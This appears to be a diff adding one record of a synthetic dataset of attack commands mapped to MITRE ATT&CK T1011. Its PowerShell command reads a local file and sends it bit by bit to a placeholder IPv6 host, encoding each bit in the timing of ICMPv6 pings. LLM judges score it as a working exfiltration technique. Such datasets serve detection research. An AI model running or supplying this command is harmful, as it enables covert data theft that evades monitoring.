@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fd00:dead:beef::9'; $bytes=[IO.File]::ReadAllBytes('C:\\Users\\Public\\notes.txt'); foreach($b in $bytes){ $bits=[Convert]::ToString($b,2).PadLeft(8,'0'); foreach($bit in $bits.ToCharArray()){ Test-Connection -ComputerName $d -Count 1 -BufferSize 256 -IPv6 -Quiet | Out-Null; Start-Sleep -Milliseconds (if($bit -eq '1'){750}else{250}) } }",
+  "explanation": "Uses a timing covert channel over ICMPv6: uniform payload echos are spaced with distinct delays to represent bit values, aligning with T1011.",
+  "rationale_steps": [
+    "Convert bytes to bit strings.",
+    "Send a constant-size ICMPv6 echo per bit.",
+    "Delay intervals encode 0/1 so a receiver can reconstruct data by observing arrival timing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-1ebf45c5",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid parameters, and acceptable use of an if-statement subexpression for Start-Sleep.",
+        "semantic_score": 5,
+        "semantic_justification": "It reads a file and automatically encodes its bits into ICMPv6 echo timings (0.25s vs 0.75s), implementing an automated timing-channel exfiltration consistent with the described technique.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:26:25.519686Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable declarations, and valid syntax for all cmdlets and methods used.",
+        "semantic_score": 5,
+        "semantic_justification": "The command implements automated exfiltration by reading a file and transmitting its contents bit-by-bit using timed ICMPv6 packets as a covert channel, which aligns perfectly with T1011 technique for automated data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:26:28.755331Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced elements, and valid cmdlet parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements a timing covert channel over ICMPv6 to exfiltrate file data bit by bit, perfectly aligning with the description of automated exfiltration (T1011).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:04:09.011569Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
